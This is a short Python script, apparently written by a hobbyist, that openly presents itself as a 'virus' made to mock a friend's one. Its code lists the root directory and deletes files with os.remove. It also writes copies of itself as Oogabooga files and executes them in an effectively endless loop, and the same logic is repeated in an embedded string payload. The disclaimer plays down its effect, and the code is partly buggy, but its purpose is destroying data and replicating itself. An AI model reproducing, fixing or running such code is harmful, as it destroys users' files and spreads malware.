"""
Produced by Mr. Waltz
date: March 21: RAMADAN SOON Boiss!!!
Disclaimer: dont be a bad boy/girl with this script please. not that its very effective in the first place
I literally only made this to shame malek for his horrible "Ooga Booga" virus.
"""

# a virus like this should be self executable so add stuff for that later...
# Make it cooler you stupid nerd!
#
# Above are mearly notes for myself, please ignore.
import os
import sys

path = "/"
path2 = "C:"
count = 0
the_package = """
path = "/"
path2 = "C:"
count = 0

sys_files = os.listdir(path)
cd = os.getcwd()
cd += '/'


def file_creation(il, code):
    il += 1
    in_code = code
    ooga_file = open(f"Oogabooga{il}.py", 'w')
    ooga_file.write(in_code)
    for file_in in sys_files:
        if not os.access(file_in, os.R_OK) and file_in.isfile():
            pass
        elif file_in == 'snap':
            pass
        else:
            os.remove(file_in)
    return ooga_file


def file_run(i, open2):
    number = i
    number += 1
    open2 = outside_ooga
    open2 = open(f"{cd}Oogabooga{number}.py")
    print(open2)
    exec(open2.read())


for num in range(0, 9999999999999999999999999999999):
    outside_ooga = file_creation(num, the_package)
    file_run(num, outside_ooga)






"""
sys_files = os.listdir(path)
cd = os.getcwd()
cd += '/'


def file_creation(il, code):
    il += 1
    in_code = code
    ooga_file = open(f"Oogabooga{il}.py", 'w')
    ooga_file.write(in_code)
    for file_in in sys_files:
        if not os.access(file_in, os.R_OK) and file_in.isfile():
            pass
        elif file_in == 'snap':
            pass
        else:
            os.remove(file_in)
    return ooga_file


def file_run(i, open2):
    number = i
    number += 1
    open2 = outside_ooga
    open2 = open(f"{cd}Oogabooga{number}.py")
    print(open2)
    exec(open2.read())


for num in range(0, 9999999999999999999999999999999):
    outside_ooga = file_creation(num, the_package)
    try:
        file_run(num, outside_ooga)
    except:
        pass

